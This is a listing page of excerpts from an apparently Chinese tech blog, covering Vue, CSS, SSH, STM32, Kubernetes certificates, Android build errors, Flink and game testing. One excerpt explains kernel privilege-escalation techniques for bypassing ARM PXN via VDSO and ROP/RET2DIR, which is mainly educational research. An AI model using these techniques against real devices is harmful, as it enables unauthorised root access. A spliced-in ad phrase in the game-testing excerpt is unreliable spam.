2.如何引入 bootcdn引入：复制script标签粘贴到html中即可引入npm安装vue: $ npm install vue使用命令行工具 (CLI)引入,默认引入非完整版，引入完整版需要配置使用webpack引入vue默认引入非完整版，引入完整版需要配置 3.两个版本的区别 a.功能上的区别： 完整版：同时包含编译器和运行时的版本。运行时：用来创建 Vue 实例、渲染并处理虚拟 DOM 等的代码。基本上就是除去编译器的其它一切。编译器：用来将模板字符串编译成为 JavaScript 渲染函数的代码。 b. 体积上区别： 运行时版本没有编译器因此相比完整版体积要小大约 30%
c.使用上的区别 1.完整版可以直接从html文件中获取html元素
例如将html中的{{n}}变成1可以这么写：
&lt;div id="app"&gt; {{ n }} &lt;/div&gt; new Vue({ el:"#app", data:{n:1} }) 2.完整版还可以直接从template中获取html元素
例如：将html中的{{n}}变成1可以这么写：
new Vue({ el:"#app" data:{n:1} template:` &lt;div&gt; {{ n }} &lt;/div&gt; ` }) 3.非完整版将html写在vue文件中通过vue-loader打包变成h函数再通过render渲染就可以渲染视图
例如在runtime版本下将页面中的n变成2
先在vue文件中写入下面代码
&lt;template&gt; &lt;div class="red"&gt; {{n}} &lt;button @click="add"&gt;+1&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { data(){ return {n:2} }, methods:{ add(){ this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7d1ccf772ec3c681df01ea2de9d7a48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33d606411702caaed75f687e7b1de33b/" rel="bookmark">
			bilibili首页推荐图片动态显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一张图片的演示 附加:Mac OS 截屏快捷键: Command+Shift+3 Mac OS 选取截屏: Command+Shift+4 一、一开始的div框架
html:
&lt;div class="one"&gt; &lt;img src="" alt=""&gt;&lt;!--之后把这段去掉--&gt; &lt;/div&gt; css:
.one{ position: relative; width: 206px; height:116px } .one:before{ content: "";/*这个参数比较重要*/ position: absolute; z-index: 1; bottom: 0;/*这个把它定义到最底下*/ left: 0; width: 100%; height: 48px; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAwCAYAAAGnNCAXAAAABGdBTUEAALGPC/xhBQAAAENJREFUCB1jYGBgYGICEpIgQgqNBRRi4MMmARYDyXKAWLwgggfOAnMJiIH0soJ0sMEJdlQWWBYshpAAK0ZwwSzS1AEAes8Ckyqvlc0AAAAASUVORK5CYII=);/*这个参数比较重要*/ background-size: contain; background-repeat: repeat-x; border-radius:0 0 2px 2px } 得到的效果:
二、填补
html:
&lt;div class="one"&gt; &lt;div class="two"&gt; &lt;img src="" alt=""&gt; &lt;/div&gt; &lt;/div&gt; css:
.one .two{ position: relative; overflow: hidden; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEsAAABHCAMAAAB4UkqjAAAAh1BMVEUAAADd3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d0UCIZXAAAALHRSTlMAoJDx4OYL/DcGF+6+JNi4ycSIT2k6LPeWfRzTVPXPszEQrV0hpo12cEZAZFpRNIQAAAJVSURBVFjD7dbZcpswGIbhHwwSi81q8Ib33fnu//oatRIpmliDhQ/aaZ+TKInnjVgkhb4RJMhP9Fzo8PiD+vEA+JPnqS0+1dRHBJhibAzh2HNeekxP9Z8XBSMZM6SmRBYx65QeM6XsY3rKPqanLGMWqeDmOh0b/Io9+YHi3gKtdExgLznSlyjFMGnUphIMlcgY22C4DSPBxTu4IrXDe+yI6IDWbPSqGVoHoohDyip6XZVB4hFN1TgPyUaYQ5rSWQ0nZGcC6UyJukKypa4yIXX3HLLlqCdHX++HLRfS/9bbWvvHLSLNR3N6tRXdFwdxejekiYF4fDnWYa/WqSm2PqRCSy0hrbP5RxAaW8141N17tVbZ+S1fFYbWFF2+1lqg62BoBdAsqWOLroWhxTh+M8vmWuuaxp1WaWjRSn43yl35sHTLUjxiaWlqnYE4LZoJme3v13MibqepFZRL6otV5V+/Hv+xVvi+FsvZG1qh/LQ7uFXnF/HlwcEfYlDktW2r5EARUiXWc1xRWAC8tGwxsdJ9dcRnYrddMdtrjDZyAy3kXrSJ7O89u8zEZAIKxBRnFzbonWD3ZkfCrrmzP+6979nicjAnW3NZ4OS1R6GtVBa8drTek539up3NAgMvcv51WNZQitCiFBZQaqIMSrx1XrWNoWTy/w1r+hk+xjuMSVjGGC6WZ3S1xlDriqTKxzB+Ra3I4bDHne62drqmied57QR9z0D94dHnOEmvJ/pWAMm4ovL2TTcJ5cRyMlHrbkdG5c/5r82fYqt+K/iR89m2JrP9PEZyI80PsPxVT0P3FAEAAAAASUVORK5CYII=);/*有阴影，必要*/ background-repeat: no-repeat; background-position:50% } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33d606411702caaed75f687e7b1de33b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73102671aa19fc5fd2596316c79bc2bb/" rel="bookmark">
			ssh免密登录失败解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一直运行正常的ssh免密登录，今天发现连接失败。
提示如下：
提示里面给了解决问题的建议。
执行命令如下：
ssh-keygen -R [ip地址]:端口号
这里注意，ip地址我使用了“[]”扩起来，这个不可省略
执行完毕后，再次测试免密登录，出现连接信息。问题解决。
思考了一下，可能是服务器是十一前，刚刚升级了ssh版本。
不过同样是升级ssh，CentOS6系统也升级了没有任何问题，这台服务器是CentOS7。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7704ccea6b19e4e451d578f2ffaa8e80/" rel="bookmark">
			如何在线快速修改图片、转换图片格式？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在线快速修改图片，图片裁剪、图片压缩、增加水印、去除水印一站式服务。修图上老馒头修图网就好了。只要上传图片，选择下格式、拖动下压缩量即可完成，非常方便，零基础操作。修改内容实时呈现，所见即所得！【老馒头修图网】：http://www.laomantou.cn;
1.【图片尺寸修改】
直接打开老馒头修图网站，选择【图片尺寸修改】，上传图片，设置目标图片大小，也可通过预设的尺寸进行设置目标图片大小。可以选择一寸、32*32等常用规格尺寸。选择目标格式即可下载图片，完成图片转换。用户可以根据自己的需要选择是否压缩图片大小，压缩时，直接拖动压缩比例条，拖动完成，即可在右侧展示压缩后的效果；
2.【图片裁剪】
直接打开老馒头修图网站，选择【图片裁剪】，上传图片，在原图上拖动裁剪矩形，回车确定即可完成裁剪，拖动完矩形也可以通过键盘上下箭头符号进行微调裁剪范围。裁剪完成，点击下载图片即可。
3.【图片格式转换】
直接打开老馒头修图网站，选择【图片格式转换】，上传图片，选择目标格式即可下载图片，完成图片转换。用户可以根据自己的需要选择是否压缩图片大小，压缩时，直接拖动压缩比例条，拖动完成，即可在右侧展示压缩后的效果；
4.【图片压缩】
直接打开老馒头修图网站，选择【图片压缩】，上传图片，根据自己的需要选择压缩比例，压缩时，直接拖动压缩比例条，拖动完成，即可在右侧展示压缩后的效果；完成压缩，下载图片即可。
5.【增加水印】
直接打开老馒头修图网站，选择【增加水印】，上传图片；输入水印文本字符，选择水印透明度、水印密度，对比目标效果，完成水印，下载图片即可。
6.【去除水印】
直接打开老馒头修图网站，选择【去除水印】，上传图片；在原图上擦除logo文字，擦除完成即可在目标效果图中查看效果，确定无误下载图片即可。
如果您用得还顺手不妨点击右侧的【收藏网站】进行收藏，谢谢阅读！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31e7b7ab5074994e07fc88431bb1876d/" rel="bookmark">
			STM32F1xx HAL库 中文详解 之 ADC篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文主要从ADC中用到的结构体、函数以及用法讲解。
目录
一、结构体
1.ADC_InitTypeDef
2.ADC_ChannelConfTypeDef
3.ADC_AnalogWDGConfTypeDef
4.ADC_HandleTypeDef
二、函数
2.1所有函数的概括及功能
三、ADC的使用
3.1配置ADC相关的顶级参数：
ADC外围功能：
●12位分辨率 ●常规转换结束时产生中断，注入转换结束时产生中断，以及发生模拟看门狗或溢出事件时产生中断。 ●单、连续转换模式。 ●扫描模式，多通道顺序转换。 ●内置数据一致性的数据对齐。 ●可编程采样时间(通道) ●常规组与注射组ADC转换。 ●常规组和注射组的外部触发器(定时器或EXTI)。 ●DMA请求生成，用于传输常规组的转换数据。 ●多模双模(可用于2台或更多adc的设备)。 ●可配置多模式双模式DMA数据存储(可用于2个或更多DCs的设备)。 ●双交错模式转换之间的可配置延迟(可用于2个或更多DCs的设备)。 ●ADC校准 ●ADC电源要求:全速时2.4 V到3.6 V，低速时降低到1.8 V。 ●ADC输入范围:从Vref-(连接到vsa)到Vref+(连接到Vdda或外部参考电压)。
一、结构体 1.ADC_InitTypeDef typedef struct { uint32_t DataAlign uint32_t ScanConvMode uint32_t ContinuousConvMode uint32_t NbrOfConversion uint32_t	DiscontinuousConvMode uint32_t NbrOfDiscConversion uint32_t	ExternalTrigConv } ADC_InitTypeDef 每个参数的含义：
DataAlign：表示对齐模式,因为我们ADC采集的数据放在ADC_DR 寄存器,ADC分辨率是12所以只能放12位,但是ADC_DR寄存器是16位的,所以要选择向左对齐还是向右对齐
宏定义：
ADC_DATAALIGN_RIGHT 右对齐
ADC_DATAALIGN_LEFT 左对齐
ScanConvMode： ADC的扫描模式,配置ADC_CR1的SCAN位,扫描模式指的是不断扫描ADC1,2,3,扫描多用在多通道上
宏定义：
Enable 使能
Disable 失能
ContinuousConvMode：连续转换模式,配置的是ADC_CR2的CON位,表示ADC通道连续采集,一次采集转化完继续采集
宏定义：
Enable 使能
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31e7b7ab5074994e07fc88431bb1876d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa07724f23cc9bd15b9a3326eff84544/" rel="bookmark">
			二进制部署K8s集群:(2) 设定自签证书
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设定自签证书,证书生成工具有很多，如openssl，这里使用cfssl证书生成工具。
cfssl是一个开源的证书管理工具，使用json文件生成证书，相比openssl更方便使用，找任意一台主机操作即可，这里在master节点操作。
一、安装CFSSL
由于CFSSL系列的工具都是独立的二进制文件，所以下载相应的二进制文件并赋予权限即可。
[root@master1 cert]# wget -c https://pkg.cfssl.org/R1.2/cfssl_linux-amd64 [root@master1 cert]# curl -s -L -o cfssljson https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64 [root@master1 cert]# curl -s -L -o cfssl-certinfo https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64 [root@master1 cert]# ll total 18808 -rw-r--r--. 1 root root 10376657 Oct 13 19:42 cfssl -rw-r--r--. 1 root root 6595195 Apr 17 03:17 cfssl-certinfo -rw-r--r--. 1 root root 2277873 Oct 13 19:50 cfssljson [root@master1 cert]# chmod +x cfssl* [root@master1 cert]# ll total 18808 -rwxr-xr-x. 1 root root 10376657 Oct 13 19:42 cfssl -rwxr-xr-x.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa07724f23cc9bd15b9a3326eff84544/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ef9b45ac80faa00035cd954bb9951d3/" rel="bookmark">
			AS @RunWith(AndroidJUnit4.class)无法识别问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 @RunWith(AndroidJUnit4.class)无法识别问题
尝试解决办法如下：
//一般没有添加这两行，添加下即可 implementation 'junit:junit:4.12' implementation 'androidx.test.ext:junit:1.1.1' androidTestImplementation 'junit:junit:4.12' androidTestImplementation 'androidx.test.ext:junit:1.1.1' 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9399cf1e93d353ee3804b2b81c1570a/" rel="bookmark">
			Error:svn:E155037:Previous operation has not finished； run ‘cleanup‘ if it was interrupted(完美解决)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 我们在Idea中使用SVN是,拉去代码时,显示报错信息
Error:svn: E155037: Previous operation has not finished; run ‘cleanup’ if it was interrupted
解决方案 - 首先打开项目所在目录
- Idea中重新拉去代码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cef18f7aa65289b2285efb0909b8333c/" rel="bookmark">
			AAPT: error: resource android:attr/lStar not found解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前项目好好的，突然有一天运行不了，一直出现AAPT: error: resource android:attr/lStar not found.这个问题。
解决办法1：
有人说把compileSdkVersion 28 升级 compileSdkVersion 31 可以问题就解决了。我试了不行
解决办法2：若是第三方库使用没有设置具体版本，在app的build.gradle中添加如下，强制项目使用具体的版本，解决问题
configurations.all {
resolutionStrategy {
force 'androidx.core:core-ktx:1.6.0'
}
}
自己试试了还是不行；
解决办法3：
仔细检查build.gradle中发现
implementation 'androidx.appcompat:appcompat:+' 只要出现新版本就会更新，所以出现错误，把
implementation 'androidx.appcompat:appcompat:+'改成 implementation 'androidx.appcompat:appcompat:1.1.0' 后来出现java.util.zip.ZipException: zip file is empty问题
解决办法：
aspectjx {
exclude 'org.jetbrains.kotlin', "module-info", 'versions.9'
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bde1b99719744dc1e960a5509209f4c/" rel="bookmark">
			shellcode找块福地－ 通过VDSO绕过PXN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给shellcode找块福地－ 通过VDSO绕过PXN 0x01 引语 近日看雪论坛里有个兄弟在写漏洞利用的时候遇到了点问题。他发现rop实现提权的方式在不同设备版本适配的时候比较麻烦,需要做的工作较多。
他想知道有没有更好更稳定的方式，绕过PXN让内核执行shellcode。
最近一年，一种利用VDSO( Virtual Dynamic Shared Object，虚拟动态共享对象)机制的攻击方式，在脏牛等漏洞利用代码中得到应用。本文将介绍这种新型的绕过PXN的攻击方式。
0x02 回顾PXN PXN( PrivilegedExecute-Never) “特权执行从不”技术由ARM公司提出，主要防御RET2USR的攻击，它的开启与否主要由页表属性的PXN位来控制。
64位内核中，内核对用户空间的内存页默认开启PXN位。通过设置PXN位，内核就不能直接执行用户空间的攻击代码，从而有效防御RET2USR攻击。
请点击此处输入图片描述
0x03 传统的PXN绕过技术 1） 利用ROP技术绕过PXN
其主要原理是通过控制内存中的一段数据，通过控制数据来控制代码执行流，如组合执行内核中特定的代码片段，从而达到修改内核中的关键数据，达到提权限的目的。这种攻击方式是需要进行不同机型中查找到多段代码片段，如果需要root的机型较多，则需要攻击者投入较多精力去做适配，另外由于ROP往往要做栈迁移，使得漏洞利用的稳定性不是很好。
2) 利用RET2DIR技术绕过PXN
该技术由哥伦比亚大学在2014年提出，其利用原理是，linux内核在设计的时候，为了提高内存的操作效率，在用户空间映射内存的时候，内核也相应地在内核的低端内存区地址映射一段影子内存。
同样，攻击者也可以将用户空间的攻击代码映射到内核的低端内存可执行区或者将特定数据进行喷射到内核的低端内存，进行内存布局，然后利用发现的漏洞，让内核执行攻击代码，从而达到提权的作用。这项技术在32位arm设备上有60%以上的成功率，而在64位arm中有96%的成功率。
通过RET2DIR和JOP方式的结合，可以使得UAF这类漏洞的利用代码比较稳定，而且成功率较高。
keen_team在cve-2015-3636的漏洞利用中使用这两个技术后，一时间RET2DIR成为漏洞利用的“倚天剑”。
不过在2016年七月google在android PIXEL(内核3.18-16.04)版本以后封杀了RET2DIR的攻击方式。
请点击此处输入图片描述
3) 通过修改寄存器绕过pxn
我们可以通过修改CP15/CR4寄存器信息来绕过PXN/SMEP。这种方式往往需要ROP一段内核的代码来修改CP15寄存器的值，其复杂度和ROP其实是一样的。
4)
通过内核特定函数完成PXN绕过。
该技术在2016年MOSEC大会上由360团队公开，该技术巧妙地利用kernel_setsockopt函数的特性，通过控制r0,
让内核执行set_fs(KERNEL_DS),实现任意地址读写权限的效果。这种方式在x64内核时需要进行ROP栈迁移, 复杂度较高。
那有没有更好的方式，给SHELLCODE安营扎寨，让内核执行我们的提权代码呢？
0x04 新的攻击方法 由于linux内核是个庞大且复杂的系统，一定还有这样的“福地”，让我们可以在内核中找到，空间任意执行我们的ShellCode。
近年攻击者把目标放在了内核和用户空间共享的代码空间－VDSO( Virtual Dynamic Shared Object，虚拟动态共享对象)。
VDSO是内核为了减少内核与用户空间频繁切换，提高系统调用效率而提出的机制。特别是gettimeofday这种对时间精度要求特别高的系统调用，需要尽可能地减少用户空间到内核空间堆栈切换的开销。
请点击此处输入图片描述
我们可以通过cat /proc/self/maps命令来查看用户态vdso映射情况。
请点击此处输入图片描述
由于该段用户空间和内核空间是一一映射的， 如果我们能在这段空间中布置我们的提权代码，我们可以让内核来执行该段代码，从而提权。
不过事情没有想象那么容易，该段空间是只读和可执行的。
通过阅读内核的代码，我们可以发现,如果我们可以把这段映射区改为可读可写可执行就可以了。
int arch_setup_additional_pages(struct linux_binprm *bprm, int uses_interp) { ret = _install_special_mapping(mm, vdso_base, vdso_text_len, VM_READ|VM_EXEC| VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC, &amp;vdso_spec[1]); .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6bde1b99719744dc1e960a5509209f4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9652050f9f55b62d418fda031442930/" rel="bookmark">
			33张图解flink sql应用提交（建议收藏！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 大家好，我是土哥。
这已经是我为读者写的第21篇 Flink系列文章了。
上周有粉丝在群里问，在流计算平台编写完Flink sql后，为什么通过一键提交按钮，就可以将sql提交到yarn集群上面了？
由于现在各大厂对业务分层特别清晰，平台方向和底层技术开发会被单独划分，所以好多大数据同学编写完 Flink Sql 后，只需通过提交按钮将其提交到集群上，对背后的提交原理也许不太清楚。
下面土哥将为大家揭开这层神秘的面纱，挖掘 Flink Sql 背后的提交原理和源码设计。（硬核文章，建议收藏！）
熟悉平台 故事 小笨猪阿土刚入职某大数据公司担任实习生，然后主管交给阿土一个任务，让其熟悉公司的 Flink 流计算平台。
阿土登录流计算平台后，看到平台上面可以编写 Sql 语法，于是就写了一个简单的 sql。
他发现旁边有个效验功能、于是就点击了一下，这时平台弹出 SQL 语法效验正确。阿土心中暗暗自喜，看来我的 sql 功底还是不错嘛。
SQL 语法效验完成后，阿土点击提交按钮，流计算平台提示，SQl 语法效验正确，已成功提交集群。
Flink sql 代码居然提交到yarn集群上了？？？
小笨猪阿土感到很惊讶，sql 就这样直接提交到集群了哇，这时候小笨猪的导师猴哥过来了，看到小笨猪的操作后，表扬了几句。
阿土，完成的不错啊，已经可以提交 sql 代码啦。但是你可别小看这简单的提交，这背后的门路可不浅呦。
这样吧，你好好探索一下这个sql提交的原理，然后写一篇分析报告，在咱们组分享一下。
啊......啊......
小笨猪阿土听到猴哥的要求后，一下就蔫了。从此之后，阿土就和 Flink sql走在了一起。
刚开始阿土很懵，于是就开始搜查 Flink sql 相关文章，过了几天，终于理清了一些思路。小笨猪将其流程总结为以下几个点：
Flink Sql解析器
Flink Planner 和 Blink Planner
Blink Sql提交流程
1. Flink Sql解析器 1.1、了解Calcite
为方便用户使用 Flink 流计算组件，Flink 社区设计了四种抽象，在这些抽象中，Sql API 属于Flink的最上层抽象，是 Flink 的一等公民，这就方便用户或者开发者直接通过 Sql 编写来提交任务。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9652050f9f55b62d418fda031442930/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c9248ee2ae3c85d564827842e299e56/" rel="bookmark">
			如何高效地做游戏测试？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们都希望作品从一开始就给大家带来完美的体验，不需要运行一系列乏味的beta测试。但事实却是花费大量的时间与精力投入到工作中，不能保持对全局的掌控。这使我们的目光远比想象的短浅。
去年，我为一款游戏做了一个亚洲风格的人物设计。我对作品还是十分满意的，所以对外公开。不久，一位艺术家看后并评论道：“配色很好，但是…比例似乎有点问题。它看起来有点畸形。你应该让它‘照照镜子’”。
我抱着怀疑的态度打开了它的Photoshop文件，快速翻动图片…之后，被吓到了。这个人物设计是歪的！这件事从一个艺术家的角度为我的世界打开了另一扇窗。我们需要及时反馈。
这就是那个人物设计，但是我当时并没有注意到。可怜的家伙，他肯定很受伤
这与游戏设计的道理是相通的。我们更倾向比较熟悉的应用技术或控制方式。与设计师的思考方式一样，我们知道游戏怎样设计以及为什么要这样设计。我们用各种各样教科书式理论来为一些极差的决策辩解，或者自信的认为我们的游戏远比它本身要好。
这就是为什么需要经常对游戏提出建设性批评意见的原因。我们需要来自同行和玩家们的意见，可以在测试中得到最真实的反馈。所以从最早的游戏原型阶段到DEMO，都需要对游戏进行定期测试。
但是，如何做一个高效的游戏测试，并且在这段乏味而又无趣的过程中享受到乐趣？这就是要在这篇文章中阐述的。
我认为在创建一个良好的测试流程中，至少要有三个关键点：
1. 与任何设计工作一样，需要一个明确的目标。
2. 学会接受一切刺耳的评论，享受这个过程，直到别人提出的意见是诚恳的、具有建设性的。
3. 简化工具及方法。
需要明确目标
根据Jesse Schell的“游戏设计艺术”，每一个测试都有一个原型。不仅为了游戏，更是为其提供体验。任何原型都是为了解答一些特定的问题而存在，是为了实现一个明确的目标。视觉效果是否吸引目标玩家？游戏的AI表现或者等级设置是否让人觉得沮丧？到达2级后看上去是否比别的游戏更糟？什么样的操作方式更适合多数的测试人员？
这些都是在测试中所要面对的问题。它们很简单、很精确，并且对提高游戏品质很有帮助。
这也同样意味着，对于每一个问题，都应该有一个预期的答案。如果仅仅只需要一个关于BOSS战的反馈，那么就不需要让测试人员完成所有的测试流程。这将浪费一项极其宝贵的资源：时间。取而代之的是，测试人员可以通过一个类似引导或教程之类的东西，在BOSS战前做一个简短的热身活动。假如只需要得到一些关于对BOSS战的视觉体验的评论，可以让测试人员直接面对一个已经被削弱过的BOSS。
如果希望测试一些可能存在的问题，这看起来很容易实现，但如果已存在一个既定的目标，它总是会阻挠你去做想做的事情。不要犹豫，做一个测试游戏的特别版，测试人员只需要完成所需求的相关部分。然而，这不是让你去拒绝“意外的幸福”或者其他一些未预期到的情况。这就是为什么我热爱测试，它总是能带来惊喜。无论有没有从战略层面考虑过，或者仅仅只是一个有趣的BUG，都应该接受这个在作品中探索更多亮点的机会。
游戏测试的两种风格
当进行测试时，一般会有2种风格：一些设计师喜欢观察测试玩家在游戏测试时候的活动；另一些设计师并不希望因为自己的存在而影响到测试玩家的游戏体验。
就我个人而言，看着测试玩家们进行游戏测试是非常有意思，可以清楚地观察他们的情绪反应。但是，不能过多地去影响他们的游戏体验。让他们去玩，不要去打扰他们。游戏的真谛，不要告诉一个玩家什么是他应该做的。
特别应该指出的是，在一个玩家发现你的游戏并测试完游戏样品后，他们大多数不会清晰的记住游戏体验。不能指望他们回忆起在游戏中所经历的所有细节。在绝大多数情况下玩游戏是一个前进的过程：我们从初始等级走向峰顶，在游戏结尾或者完成所有游戏关卡，只有极少数片段被记住。
另外一种风格则认为不应该在测试的时候打扰玩家，因为这样会影响到他们。即使不说话，你的存在可能从某种程度上依旧会迫使他们玩得不自然。这个想法是尽量不影响他们，在他们测试游戏的时候不要干扰他们。当然毋庸置疑的是，你的存在可能还是会对玩家的游戏体验造成影响。但是如果并没有指望一个科学而又精准的结果，直接与玩家接触会使整个测试变得更有趣也更迅速。
同样，当收到来自测试玩家或者同行的反馈时，也不应该唧唧歪歪。这是我刚从业时被告知的。应该多花些时间去倾听批评与争论。当从一个人的话语中感受到情绪时，这往往会说明这个人是真诚的。如果在一个人发表意见的时候打断她，你会妨碍到她在表达时候的的整个逻辑思维，她有可能不能清楚的表达出观点。这说明你在感情层面上还不能成熟的去接受而且这可能会浪费你的口水与测试人员的时间。
用一种有趣的方法进行Beta测试
无论如何，游戏测试并不需要像游戏设计师一样经历那么多痛苦。这是一个心态的问题。无论得到什么样的反馈，也只有这些能帮助完善作品。你有权利去评论一些把项目相关的问题考虑在内的建议。你也有权利不去接受这些建议，但是这有可能会使你为了一些蝇头小利而得不偿失。
我认为测试是建立游戏作品和玩家之间沟通的桥梁。这是一个把欢乐融入工作的好机会。一方面,做些必要的工作:收集反馈。同时,我们正在寻找一个机会来与玩家进行互动,通过玩家与作品这个共同体来磨合我们的关系。这取决于测试环境。因为我经常一个人工作，所以会时不时地在网上放一些测试样本。
我会在当地的咖啡馆展示作品。温暖的氛围会将测试变成一种有趣的工作。这真是一个减轻工作压力的好方法。退一步来说,这是一个好机会可以使你更专注于所期望的。即使不是积极的反馈, 也可以享受与玩家之间的互动。至少这是让我做游戏的原因:感受人与人之间的联系。它可能不适合所有人,但我们作为设计师的工作是为其他人制作游戏。我们把工作重心放在为玩家服务上。这种人生观驱使我即使是在收到令人不舒服的甚至消极的反馈后依然保持着深深地感激。只要这个反馈是诚恳的(那些怀恨在心的人还是去屎吧)。
作为一名设计师，与他人沟通交流是非常重要的。理解能力,交流能力，对分享作品时的喜悦来说是至关重要。这也有助于提出更多问题,来获取更多的反馈。可以把测试看作为一个很好的机会来使自己和作品共同进步。与玩家及用户保持联系，可以更好地了解他们和他们的需求。为玩家们的喜好来量身定做，这对制作伟大的游戏来说是必不可少的条件。
简化测试过程
与游戏开发一样,我们想建立一个通用的工作流程来使测试更高效。
在面对面的情况下进行测试,过程很简单:可以提前准备问题,一个接一个的面试测试人员。在测试完之后,会给他们留下深刻的印象。
我很喜欢一对一的测试。他们在游戏如何影响玩家方面提供了大量深刻的见解。可以直接在他们脸上看到情绪和反应。然而,个人访谈在获取技术信息时仍受到很大的限制。
如果是针对项目开发方面,我们需要更大规模的反馈。如何顺利将游戏运行在各种移动设备上,或者只是为了验证我们的玩家数量统计数据。在这种情况下,个人测试并不理想。我们更希望在线测试。以往的经验，很难向随机和远程玩家收集有价值的反馈。幸运的是，有两个工具使我们最大化收集数据的数量和质量:吸引人的精简问卷和分析模型。
谁不喜欢一个漂亮的问卷？
事实上，很少有人喜欢墨守成规的问卷。或者更确切地说,大多数人都讨厌那些满载问题的问卷以及大篇幅的文本。构建一个简单又美观的问卷还是比较容易的。但是有一些规则我们必须遵循。第一个是尽可能的保持精炼简短。应该合乎逻辑地组织并紧扣目的。如果一定要问很多问题,将问卷分解成多个页面。或者将测试分解为多个样本。
另一种可靠的方法来证明暴露的问题就是游戏截图。比如，如果玩家们正在讨论BOSS巢穴的入口在哪，只需要一个截图就能解决。玩家们将通过观察环境来解答他们的困惑，这也使玩家在游戏体验中添加更多值得回忆的插曲。
可以通过使用一个像谷歌问卷这样的免费服务来快速构建定制的问卷。如果可能的话,甚至可以在游戏内进行一项完整调查。这样,将会发现，任何一个随机线上玩家都会使你的游戏更完整。这在广告或游戏中都是很常见的。奇怪的是,在娱乐产业中是相当罕见的。
将问卷集成到游戏中提供了另一个优势:可以用你喜欢的API分析来收集结果。
让API分析来代替
游戏分析可以重复利用和改造,所以他们是在改进Beta测试流程时很好的备用手段。
一些基本的指标适用于大多数游戏，好比多有少次玩家在挑战中失败。如果把这些指标与调查的结果有效地联系起来，可以自动地比较玩家死亡的次数和某一特定等级下的综合指标。这可以对游戏平衡做出很好的指引。
你可能会说也可以直接从问卷中得到答案。这一点是正确的！如果进一步深入挖掘，卖二手游戏账号平台会发现漏斗和其他通用指标将带来客观、正面、积极的见解。不能要求所有想要的东西都在一张问卷中,必须让其保持精简。各种各样的指标会给到你一些从未预料到的东西。这就是从《狂神国度》中发现的,在游戏中的道具购买支撑了整个游戏的经济系统。这是一个很好的游戏商业模式。
《狂神国度》，一个看上去并不起眼但是很好玩的游戏 另外,一旦掌握了这些,分析就会变得简单又实用。仅需要一个程式编码行就可以收集一连串的数据。特别是在游戏分析中，追踪一些玩家的选择时,有些是人工很难做到的。某种意义上，分析跟测试是一对好基友，专注为游戏测试寻找各种各样的反馈。
关键
这一次，这篇文章的总结就不弄的那么花哨了。这在开篇的时候已经介绍过了。如果想为游戏改进测试方法并获得更好的反馈，你可以遵照以下3点建议：
1. 选择明确、具体的目标；
2. 学会接受建设性的批评意见，愉快的完成每个环节。
3. 通过问卷和分析来简化你的测试
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a43541f01c023ad5a24e332ad06c8d28/" rel="bookmark">
			Unity导出exe时遇到的两个问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity导出 file-&gt;build settings-&gt;build
平台、目标平台、x86_64 这三样按照自己电脑选好就行，默认就是对的。
遇到的问题 报错'The member 'CameraSensorComponent.camera' does not hide an accessible member. The new keyword is not required.'
